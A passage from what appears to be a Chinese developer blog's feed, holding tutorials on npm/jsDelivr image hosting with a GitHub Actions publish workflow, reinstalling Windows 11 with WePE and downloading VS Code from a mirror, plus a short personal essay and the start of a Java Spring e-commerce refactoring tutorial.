class="line">https://cdn.jsdelivr.net/npm/[NpmPackageName]/img/wallhaven-72x31v.png</span><br></pre></td></tr></table></figure><blockquote><p>可以看到Npm只需要提供包名即可。这也是一开始要求包名不重复的原因之一</p></blockquote><p>jsDelivr+Npm依然有100MB的包大小限制，但是NPM有丰富的国内节点。可以挑选一个使用。个人推荐知乎的。没有大小限制，而且也很稳定。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【jsd出品，网宿国内节点】</span><br><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/npm/</span>:package@:version/:file</span><br><span class="line">【unpkg 自建】</span><br><span class="line">https:<span class="regexp">//</span>cdn.cbd.int<span class="regexp">/:package@:version/</span>:file</span><br></pre></td></tr></table></figure><p>当然你也可以利用<a href="https://unpkg.com/">unpkg</a>自建。(UNPKG 是一个内容源自 npm 的全球快速 CDN。它部署在 cloudflare 上，在大陆地区访问到的是香港节点。所以速度也不错。)</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/unpkg.com/</span><span class="symbol">:package</span>@<span class="symbol">:version/</span><span class="symbol">:file</span></span><br></pre></td></tr></table></figure><h3 id="3-2-图片转换与发布">3.2 图片转换与发布</h3><p>如果每次都要在本地进行<code>npm publish</code>的话，npm的提交是整个包一起上传的，不存在增量更新，耗时不说，而且还往往需要架梯子才能正常上传。所以我们可以把它交给github action来完成。</p><ol><li>在<a href="https://www.npmjs.com/">npm官网</a>-&gt;头像-&gt;Access Tokens-&gt;Generate New Token,勾选Automation 选项，<code>Token</code>只会显示这一次，之后如果忘记了就只能重新生成重新配置了。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505015328425.png" alt="image-20230505015328425"></p><p><img src="https://img.777nx.cn/test/image-20230505015408100.png" alt="image-20230505015408100"></p><ol start="2"><li>在github的[AssetsRepo]仓库设置项里添加一个名为<code>NPM_TOKEN</code>的<code>secrets</code>，把获取的Npm的Access token输入进去。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505015618726.png" alt="image-20230505015618726"></p><ol start="3"><li>在本地的<code>[AssetsRepo]</code>文件夹下新建<code>[AssetsRepo]/.github/workflows/autopublish.yml</code></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Node.js</span> <span class="string">Package</span></span><br><span class="line"><span class="comment"># 监测图床分支，2020年10月后github新建仓库默认分支改为main，记得更改</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">$&#123;&#123;secrets.npm_token&#125;&#125;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在本地的<code>[AssetsRepo]</code>文件夹下打开终端，运行以下指令，上传新增内容至 github，即可触发部署。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;npm publish&quot;</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>此处的四行指令顺序严格。<br>每次更新 npm 图床都需要先修改<code>[AssetsRepo]\package.json</code>里的<code>version</code>,也就是版本号。<br>而<code>npm version patch</code>即为更新 package.json 里的版本号的指令，效果是末尾版本号+1，例如<code>0.0.1=&gt;0.0.2</code>、<code>1.1.3=&gt;1.1.4</code>。免去了打开<code>package.json</code>再修改版本号的麻烦。（大版本更新还是需要手动改的）<br>更新 npm 图床务必要记得更新<code>package.json</code>里的版本号！</p></div><h2 id="四、参考教程">四、参考教程</h2><ol><li><p><a href="https://www.fomal.cc/posts/d7fb1ba1.html">免费图床综合教程</a></p></li><li><p><a href="https://anzhiy.cn/posts/72ea.html">npm图床使用</a></p></li></ol><h2 id="五、最后">五、最后</h2><ol><li><p>GitHub图床仓库大小不能超过1G。当仓库超过1G后会有人工审核仓库内容，如果发现用来做图床，轻则删库重则封号。</p></li><li><p>Npm有<code>100MB</code>的包大小限制，但是NPM有丰富的国内节点。</p></li></ol>]]></content>
    
    
    <summary type="html">构建免费图床</summary>
    
    
    
    <category term="博客" scheme="https://www.777nx.cn/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="图床" scheme="https://www.777nx.cn/tags/%E5%9B%BE%E5%BA%8A/"/>
    
  </entry>
  
  <entry>
    <title>全网最详细的重装系统教程</title>
    <link href="https://www.777nx.cn/posts/4aa3a157.html"/>
    <id>https://www.777nx.cn/posts/4aa3a157.html</id>
    <published>2023-04-26T23:54:49.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="tip home"><p>以下文章来源于BOOM哥，作者BOOM哥</p></div><div class="note info flat"><p>参考：<a href="https://mp.weixin.qq.com/s/QnQuGfU-1uhOq5nr-cxOKA">全网最详细的重装系统教程</a></p></div><h2 id="一、前言">一、前言</h2><p>相信大家都听说过重装系统。重装系统是在电脑系统出现问题或受到恶意软件、流氓软件的“污染”时可以让电脑满血复活的一种电脑抢救措施。很多小伙伴看到“重装系统”两个字就觉得重装系统非常难。</p><p>其实并不是，重装系统真的不难，这是有点麻烦。学会重装系统后，我们可以在紧急情况下抢救我们的电脑，让它瞬间满血复活。所以非常建议每一位小伙伴学一学怎么重装系统。今天的重装系统教程写的比较详细，希望它能在紧急情况下给大家提供一些帮助。</p><p><img src="https://img.777nx.cn/test/image-20230426235739979.png" alt="image-20230426235739979"></p><p>今天就教大家怎么使用“微PE工具箱”给电脑重装<strong>纯净</strong>的Windows11系统吧。</p><blockquote><p>**注意：**其他Windows系统的重装方法也跟Windows11的重装方法一模一样。</p></blockquote><p>先给大家介绍一下微PE工具箱。它是一个非常不错的PE系统U盘制作工具，免费且无广告，安全可靠，也是我最喜欢的一个PE系统U盘制作工具。因为在不久前有好多老牌PE系统U盘制作工具（如装机大师、大白菜等等）被曝给用户电脑偷偷安装流氓软件，所以在这里不建议大家使用其他PE系统U盘制作软件。</p><h2 id="二、准备工作">二、准备工作</h2><ol><li>准备一个8GB以上的<strong>空</strong>U盘（在PE系统U盘制作过程中，U盘会被格式化）</li><li>准备一台可以正常上网使用的电脑</li></ol><h2 id="三、下载-安装-微PE工具箱">三、下载&amp;安装&quot;微PE工具箱&quot;</h2><ol><li>用电脑打开微PE工具箱官网，官网链接在这里：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.wepe.com.cn/download.html?tdsourcetag=s_pcqq_aiomsg</span><br></pre></td></tr></table></figure><ol start="2"><li>点击【查看下载地址列表】：</li></ol><p><img src="https://img.777nx.cn/test/680.png" alt="图片"></p><ol start="3"><li>点击【我已捐赠，继续查看下载地址】</li></ol><p>当然，在这里大家也可以选择支持一下微PE工具箱团队，因为这个软件真的非常好用。</p><p><img src="https://img.777nx.cn/test/660.png" alt="660"></p><ol start="4"><li>下载最新版微PE工具箱的64位版本：</li></ol><p><img src="https://img.777nx.cn/test/661.png" alt="661"></p><ol start="5"><li><strong>将准备好的空U盘插入到电脑中：</strong></li></ol><p><img src="https://img.777nx.cn/test/662.png" alt="662"></p><ol start="6"><li>解压下载好的微PE工具箱压缩包并打开，双击运行其中的exe文件：</li></ol><p><img src="https://img.777nx.cn/test/663.png" alt="663"></p><ol start="7"><li>点击【其他安装方式】右侧的<strong>U盘图标</strong>，即选择【安装PE到U盘】：</li></ol><p><img src="https://img.777nx.cn/test/664.png" alt="664"></p><ol start="8"><li>选好自己刚刚插入的U盘后，点击【立即安装进U盘】，其他地方不用改：</li></ol><p><img src="https://img.777nx.cn/test/665.png" alt="665"></p><ol start="9"><li>点击【开始制作】：</li></ol><p><img src="https://img.777nx.cn/test/666.png" alt="666"></p><ol start="10"><li>点击【完成安装】：</li></ol><p><img src="https://img.777nx.cn/test/667.png" alt="667"></p><ol start="11"><li>就这样，PE系统U盘制作完成了。打开此电脑可以发现U盘被分成了两个分区，一个分区容量较大，这个分区可以正常存放文件。另一个分区名字叫【EFI】，这个分区非常重要，不能给里面存储其他文件，<strong>里面的文件也不能动！！</strong></li></ol><p><img src="https://img.777nx.cn/test/668.png" alt="668"></p><h2 id="四、下载系统ISO文件，并拷贝到PE系统U盘">四、下载系统ISO文件，并拷贝到PE系统U盘</h2><p>接下来，我们要从MSDN上下载纯净的Windows11操作系统ISO文件（镜像文件），并将它拷贝到PE系统U盘的那个容量较大，可以正常存放文件的分区中。</p><p>MSDN提供的系统资源都来自微软，MSDN可以理解为微软在中国的资源下载网站，大家可以放心使用里面的系统资源。</p><ol><li>用电脑打开以下链接进入MSDN：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//m</span>sdn.itellyou.cn/</span><br></pre></td></tr></table></figure><ol start="2"><li>点击【Windows11】：</li></ol><p><img src="https://img.777nx.cn/test/image-20230427001136575.png" alt="image-20230427001136575"></p><ol start="3"><li>输入自己的账号进行登录。如果没有注册过账号，可以注册一下：</li></ol><p><img src="https://img.777nx.cn/test/image-20230427001156665.png" alt="image-20230427001156665"></p><ol start="4"><li>点击Windows11下方的【详细信息】：</li></ol><p><img src="https://img.777nx.cn/test/image-20230427001351234.png" alt="image-20230427001351234"></p><ol start="5"><li>用迅雷下载系统ISO文件：</li></ol><p><img src="https://img.777nx.cn/test/image-20230427001500155.png" alt="image-20230427001500155"></p><blockquote><p>**注意：**不知道business edition和consumer edition区别的小伙伴看这里</p></blockquote><p><img src="https://img.777nx.cn/test/641.png" alt="641"></p><ol start="6"><li>将下载好的系统ISO文件拷贝到PE系统U盘的容量大的分区中：</li></ol><p><img src="https://img.777nx.cn/test/642.png" alt="642"></p><p><strong>就这样，可以重装系统的PE系统U盘已经制作完成了。</strong></p><h2 id="五、重启故障电脑，重装系统">五、重启故障电脑，重装系统</h2><ol><li>接下来，将已经制作好的PE系统U盘插入到要重装系统的电脑中并重启它。当它重启出现开机画面时不停的按<strong>启动热键</strong>，出现选择菜单时选择自己的U盘，进入微PE。不知道自己电脑的启动热键的小伙伴看这里：</li></ol><p><img src="https://img.777nx.cn/test/643.png" alt="643"></p><p><img src="https://img.777nx.cn/test/644.png" alt="644"></p><ol start="2"><li>进入PE系统后，打开此电脑，打开PE系统U盘的有系统ISO的分区，鼠标右键点击此ISO文件，选择【装载】，再双击运行【Setup.exe】：</li></ol><p><img src="https://img.777nx.cn/test/645.png" alt="645"></p><p><img src="https://img.777nx.cn/test/646.png" alt="646"></p><p><img src="https://img.777nx.cn/test/647.png" alt="647"></p><ol start="3"><li>点击【现在安装】：</li></ol><p><img src="https://img.777nx.cn/test/648.png" alt="648"></p><ol start="4"><li>此时可能会出现密钥输入窗口。如果知道自己电脑原来的系统的密钥的话可以填进去。如果不知道的话就选【我没有产品密钥】，先安装系统，进入系统后再激活：</li></ol><p><img src="https://img.777nx.cn/test/649.png" alt="649"></p><ol start="5"><li>选择系统类型：</li></ol><p><img src="https://img.777nx.cn/test/650.png" alt="650"></p><ol start="6"><li>选择【自定义：仅安装Windows（高级）】：</li></ol><blockquote><p>**小提示：**这里也可以选【升级：安装Windows并保留文件、设置和应用程序】。如果你的电脑原来的系统没啥问题，你只是想升级一下系统的话可以选此选项。此选项不会格式化C盘。</p><p>如果你的电脑曾经中毒了或者被流氓软件“占领”了，那么我建议你选【自定义：仅安装Windows（高级）】，此选项会格式化C盘再安装系统，可以彻底杀死C盘中的病毒或流氓软件</p></blockquote><p><img src="https://img.777nx.cn/test/651.png" alt="651"></p><ol start="7"><li>选择自己电脑的C盘（按空间大小），并点击下一步</li></ol><p><img src="https://img.777nx.cn/test/652.png" alt="652"></p><ol start="8"><li>现在按提示操作就可以了，该避开的坑我已经说完了。</li></ol><p><strong>最后系统安装完成后会提示电脑将会在10秒内重启。此时等待电脑重启就可以了。当电脑重启进入黑屏状态时要立刻拔掉U盘！！！！！如果倒计时结束后电脑只是回到了PE系统，并没有自动重启的话，自己手动重启（PE系统左下角有重启/关机选项）就可以了。但无论是那种重启，在电脑黑屏时都必须要立刻拔掉U盘！！！</strong></p><ol start="9"><li><p>接下来电脑可能会重启好几次，这些都正常。这过程中不需要碰电脑，等待它正式进入系统设置页面就OK了。</p></li><li><p>进入桌面后不要忘了安装驱动程序，否则电脑会很卡。安装驱动时建议使用电脑官方提供的电脑管家。如果是组装机，那么可以从该主板品牌官网直接下载必要的驱动程序。个人不太建议使用驱动人生等乱七八糟的软件，因为这些软件也有很多流氓行为，一不小心就会给电脑安装流氓软件。</p></li></ol><p><img src="https://img.777nx.cn/test/670.png" alt="670"></p><ol start="11"><li>就这样，重装系统结束了。</li></ol><h2 id="六、最后">六、最后</h2><p>系统没有激活，系统的功能会被限制，比如你在桌面空白处点击右键，进入个性化设置，就会要求你进行激活，而WIN11激活需要秘钥。不懂激活，可以去我的公众号：<strong>Fantasy的技术小站</strong>，回复“激活”，也可以百度搜下激活。这样，所有的系统的相关事情就搞完了。</p>]]></content>
    
    
    <summary type="html">手把手教你重装系统</summary>
    
    
    
    <category term="计算机基础" scheme="https://www.777nx.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Windows" scheme="https://www.777nx.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>vscode镜像下载</title>
    <link href="https://www.777nx.cn/posts/b663c12a.html"/>
    <id>https://www.777nx.cn/posts/b663c12a.html</id>
    <published>2023-04-21T19:42:01.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>vscode官方网站下载速度太慢，非正规网站又不太敢下，通过镜像源下载就好了。</p><h2 id="教程">教程</h2><p>你们不介意版本的话，下面是1.78版本的链接（直接复制下载就好了）：<br><a href="https://vscode.cdn.azure.cn/stable/252e5463d60e63238250799aef7375787f68b4ee/VSCodeUserSetup-x64-1.78.0.exe">https://vscode.cdn.azure.cn/stable/252e5463d60e63238250799aef7375787f68b4ee/VSCodeUserSetup-x64-1.78.0.exe</a></p><ol><li>首先进入<a href="https://code.visualstudio.com/">vscode官方网站</a>，点击Download for Windows下载（最新版）。</li></ol><p><img src="https://img.777nx.cn/test/image-20230421194611880.png" alt="image-20230421194611880"></p><ol start="2"><li>然后进入到下载页面，点击链接，加载一会会，等到出现链接</li></ol><p><img src="https://img.777nx.cn/test/image-20230421194725264.png" alt="image-20230421194725264"></p><ol start="3"><li>直接在地址栏按下面方式修改就好啦。将地址中的/stable前的<code>az764295.vo.msecnd.net</code>换成<code>vscode.cdn.azure.cn</code>，再回车就会直接在下载列表啦。</li></ol><p><img src="https://img.777nx.cn/test/image-20230421195057696.png" alt="image-20230421195057696"></p><h2 id="最后">最后</h2><p>我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=9m0hq0k625h2">https://cloud.tencent.com/developer/support-plan?invite_code=9m0hq0k625h2</a></p>]]></content>
    
    
    <summary type="html">vscode镜像下载</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="vscode" scheme="https://www.777nx.cn/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>如果时光可以倒流</title>
    <link href="https://www.777nx.cn/posts/f7be2b02.html"/>
    <id>https://www.777nx.cn/posts/f7be2b02.html</id>
    <published>2023-04-02T11:38:34.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h1>如果时光可以倒流</h1><p>如果真的有反方向的钟，我希望回到刚遇见你的时候，因为那个时候，我连你叫什么都不感兴趣。</p><p>一开始就知道我们注定无法在一起，但我却没能藏住心底的秘密。想到这里我的内心就开始隐隐作痛。</p><p>喜欢你和放下你，我都做不到。</p><p>比结束更痛苦的，就是拖泥带水的耗着。说爱吧，耗尽了所有希望，说不爱吧，又在某个瞬间发了疯的想。一边崩溃，一边自愈，反反复复，一边清醒，一边糊涂，一边说放下，一边又无可救药的想。</p>]]></content>
    
    
    <summary type="html">time-reverse</summary>
    
    
    
    <category term="生活趣闻" scheme="https://www.777nx.cn/categories/%E7%94%9F%E6%B4%BB%E8%B6%A3%E9%97%BB/"/>
    
    
    <category term="时光" scheme="https://www.777nx.cn/tags/%E6%97%B6%E5%85%89/"/>
    
  </entry>
  
  <entry>
    <title>eshop商城项目实训代码重构</title>
    <link href="https://www.777nx.cn/posts/f56b144a.html"/>
    <id>https://www.777nx.cn/posts/f56b144a.html</id>
    <published>2023-03-30T11:28:00.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<div class="note info no-icon flat"><p><strong>eshop商城项目实训系列教程导航</strong></p><ol><li><a href="https://www.777nx.cn/posts/3bc4be07.html">eshop商城项目实训源码</a></li><li><a href="https://www.777nx.cn/posts/f56b144a.html">eshop商城项目实训代码重构</a> &lt;= 当前位置</li></ol></div><h2 id="基本架构">基本架构</h2><p>要先把基本框架搭建起来，才能够愉快的写代码</p><h3 id="1-entity">1. entity</h3><p>先看下数据库表结构</p><p><img src="https://img.777nx.cn/test/image-20230330174111302.png" alt="image-20230330174111302"></p><p>要在<code>eshop-business</code>模块下新建<code>src\main\java</code>的文件夹，在该文件夹下创建<code>com.eshop.entity</code>的包，在该包下创建<code>StoreProductRelation</code>的实体类与之数据表一一对应，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoreProductRelation</span> <span class="keyword">extends</span> <span class="title class_">BaseDomain</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableId(value = &quot;id&quot;, type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> Long uid;</span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line">    <span class="keyword">private</span> String type;</span><br><span class="line">    <span class="keyword">private</span> String category;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为该表继承了<code>BaseDomain</code>，拥有父的属性</p><p><code>BaseDomain</code>的部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">   <span class="meta">@TableField(</span></span><br><span class="line"><span class="meta">       fill = FieldFill.INSERT</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="meta">@JsonFormat(</span></span><br><span class="line"><span class="meta">       pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;,</span></span><br><span class="line"><span class="meta">       timezone = &quot;GMT+8&quot;</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="keyword">private</span> Date createTime;</span><br><span class="line">   <span class="meta">@TableField(</span></span><br><span class="line"><span class="meta">       fill = FieldFill.UPDATE</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="meta">@JsonFormat(</span></span><br><span class="line"><span class="meta">       pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;,</span></span><br><span class="line"><span class="meta">       timezone = &quot;GMT+8&quot;</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="keyword">private</span> Date updateTime;</span><br><span class="line">   <span class="meta">@TableLogic</span></span><br><span class="line">   <span class="meta">@JsonIgnore</span></span><br><span class="line">   <span class="meta">@TableField(</span></span><br><span class="line"><span class="meta">       fill = FieldFill.INSERT</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="keyword">private</span> Integer isDel;</span><br></pre></td></tr></table></figure><h3 id="2-mapper">2. mapper</h3><p>在<code>mapper</code>的包下新建<code>ProductRelationMapper</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.eshop.domain.StoreProductRelation;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRelationMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;StoreProductRelation&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-service">3. service</h3><p>在<code>service</code>的包下新建<code>ProductRelationService</code>的类，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.IService;</span><br><span class="line"><span class="keyword">import</span> com.eshop.domain.StoreProductRelation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRelationService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;StoreProductRelation&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建<code>ProductRelationServiceImpl</code>的实现类，实现<code>ProductRelationService</code>的接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.eshop.api.EshopException;</span><br><span class="line"><span class="keyword">import</span> com.eshop.domain.StoreProductRelation;</span><br><span class="line"><span class="keyword">import</span> com.eshop.mapper.ProductRelationMapper;</span><br><span class="line"><span class="keyword">import</span> com.eshop.service.ProductRelationService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductRelationServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;ProductRelationMapper, StoreProductRelation&gt; <span class="keyword">implements</span> <span class="title class_">ProductRelationService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ProductRelationMapper productRelationMapper;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-controller">4. controller</h3><p>在<code>com.eshop</code>下新建一个包，包名叫<code>controller</code>，新建一个类，类名叫<code>ProductCollectController</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.NumberUtil;</span><br><span class="line"><span class="keyword">import</span> com.eshop.api.ApiResult;</span><br><span class="line"><span class="keyword">import</span> com.eshop.api.EshopException;</span><br><span class="line"><span class="keyword">import</span> com.eshop.common.bean.LocalUser;</span><br><span class="line"><span class="keyword">import</span> com.eshop.common.interceptor.AuthCheck;</span><br><span class="line"><span class="keyword">import</span> com.eshop.modules.product.param.StoreProductRelationQueryParam;</span><br><span class="line"><span class="keyword">import</span> com.eshop.service.ProductRelationService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.annotation.Validated;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span 